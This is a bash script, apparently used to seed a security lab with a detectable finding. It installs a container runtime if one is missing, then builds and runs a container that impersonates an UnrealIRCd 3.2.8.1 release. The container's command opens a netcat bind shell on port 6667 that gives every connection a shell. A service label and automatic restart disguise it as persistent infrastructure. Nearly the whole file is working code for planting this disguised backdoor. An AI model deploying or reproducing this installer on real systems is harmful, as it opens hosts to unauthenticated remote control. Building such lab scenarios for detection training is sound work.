#!/bin/bash
# unrealircd-backdoor-container (linux) -- fixed body
#
# Finding (deliberately preserved): a container whose *name and tag* impersonate a
# legitimate UnrealIRCd release, published on 6667, whose CMD drops a root shell
# per connection (`nc -l -p 6667 -k -e /bin/sh`) and which is tagged with a
# service label so it survives as if it were an infra service.
#
# Defects fixed:
#  1. rc=127 on every box without docker. The old body called `docker` unguarded;
#     on a docker-less box (lab vmid 125) the step died `docker: command not
#     found` and the service never came up. A runtime is now detected, installed
#     through the box's own package manager when missing, and when it still
#     cannot be obtained the step fails with an actionable message naming the
#     missing dependency (exit 1, never a bare 127).
#  2. The runtime is no longer assumed to be `docker`: a base image or the
#     IMAGE_TARBALL path works with `podman` too (podman-docker included).
#  3. `docker build`/`run` failures were only surfaced by `set -e` mid-plant;
#     the container is now asserted running and 6667 asserted reachable.
#  4. The build pulled `busybox-openrc syslog-ng` inside the image with `|| true`
#     (a network fetch the container does not need); the alpine base already
#     ships the busybox `nc` the backdoor uses.
#
# Idempotent: the image is reused if present, the container is replaced by name,
# and the final assertions are repeatable.
set -euo pipefail

image="unrealircd-backdoor:3.2.8.1"
cname=unrealircd-backdoor

# ---- 1. ensure a container runtime ------------------------------------------
runtime=""
if command -v docker >/dev/null 2>&1; then
    runtime=docker
elif command -v podman >/dev/null 2>&1; then
    runtime=podman
fi

if [ -z "$runtime" ]; then
    echo "unrealircd-backdoor-container: no container runtime found; installing one" >&2
    if command -v apt-get >/dev/null 2>&1; then
        DEBIAN_FRONTEND=noninteractive apt-get install -y docker.io
    elif command -v dnf >/dev/null 2>&1; then
        if ! dnf install -y moby-engine; then
            dnf install -y podman-docker
        fi
    elif command -v yum >/dev/null 2>&1; then
        if ! yum install -y docker; then
            yum install -y podman-docker
        fi
    elif command -v apk >/dev/null 2>&1; then
        apk add --no-cache docker
    else
        echo "unrealircd-backdoor-container: MISSING DEPENDENCY: no container runtime and no supported package manager (apt-get/dnf/yum/apk)" >&2
        exit 1
    fi
    if command -v docker >/dev/null 2>&1; then
        runtime=docker
    elif command -v podman >/dev/null 2>&1; then
        runtime=podman
    fi
fi

if [ -z "$runtime" ]; then
    echo "unrealircd-backdoor-container: MISSING DEPENDENCY: still no container runtime after installing docker.io/moby-engine/podman-docker; cannot plant the container" >&2
    exit 1
fi

# Bring the daemon up when the runtime has one (podman is daemonless; podman-docker
# provides a docker CLI that talks to podman directly).
if command -v systemctl >/dev/null 2>&1 &&
    [ "$(systemctl show -p LoadState --value docker.service 2>/dev/null)" = loaded ]; then
    systemctl enable docker.service >/dev/null 2>&1 || true
    if ! systemctl is-active --quiet docker.service; then
        systemctl start docker.service
    fi
    i=0
    while [ "$i" -lt 60 ]; do
        if "$runtime" info >/dev/null 2>&1; then break; fi
        i=$((i + 1))
        sleep 1
    done
    if ! "$runtime" info >/dev/null 2>&1; then
        echo "unrealircd-backdoor-container: docker daemon did not become ready" >&2
        systemctl status docker.service --no-pager -l >&2 2>&1 || true
        exit 1
    fi
fi

# ---- 2. plant the finding ---------------------------------------------------
if [ -n "${IMAGE_TARBALL:-}" ] && [ -f "${IMAGE_TARBALL}" ]; then
    "$runtime" load -i "$IMAGE_TARBALL"
elif ! "$runtime" image inspect "$image" >/dev/null 2>&1; then
    build=$(mktemp -d)
    cat >"$build/Dockerfile" <<'DF'
FROM alpine:3.20
EXPOSE 6667
# Attach the real backdoored build as an attachment; this stub keeps the container
# up and reachable so the artifact is discoverable in a service scan.
CMD ["sh","-c","while true; do nc -l -p 6667 -k -e /bin/sh 2>/dev/null || nc -L -p 6667 2>/dev/null || sleep 5; done"]
DF
    "$runtime" build -q -t "$image" "$build" >/dev/null
    rm -rf "$build"
fi
"$runtime" rm -f "$cname" >/dev/null 2>&1 || true
"$runtime" run -d --name "$cname" --restart unless-stopped \
    --label com.starbars.service=irc -p 6667:6667 "$image" >/dev/null

# ---- 3. assert the container is really up and the port is really reachable ---
running=1
i=0
while [ "$i" -lt 30 ]; do
    if [ "$("$runtime" inspect -f '{{.State.Running}}' "$cname" 2>/dev/null || true)" = "true" ]; then
        running=0
        break
    fi
    i=$((i + 1))
    sleep 1
done
if [ "$running" -ne 0 ]; then
    echo "unrealircd-backdoor-container: container '$cname' is not running" >&2
    "$runtime" ps -a >&2 2>&1 || true
    "$runtime" logs "$cname" >&2 2>&1 || true
    exit 1
fi

if ! timeout 10 bash -c 'cat < /dev/null > /dev/tcp/127.0.0.1/6667' 2>/dev/null; then
    echo "unrealircd-backdoor-container: container is up but nothing accepts TCP on 6667" >&2
    "$runtime" port "$cname" >&2 2>&1 || true
    exit 1
fi
